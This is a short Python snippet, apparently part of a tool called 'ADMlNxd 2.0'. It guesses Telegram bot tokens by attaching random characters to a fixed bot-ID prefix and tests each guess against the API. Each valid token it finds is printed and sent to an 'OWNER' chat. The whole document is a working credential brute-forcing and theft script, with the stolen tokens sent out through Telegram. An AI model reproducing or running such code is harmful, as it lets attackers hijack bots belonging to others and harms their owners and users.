#ADMlNxd 2.0
token = "609517172:AA" + "".join(random.choices(chars,k=33))
new_bot = Bot(token)
try:
  username = new_bot.username
  if username:
    print(token)
    LOGGING(username)
    new_bot.send_message(OWNER, token)
    LOGGING("Har Har Mahadev 🚩")
except:
  pass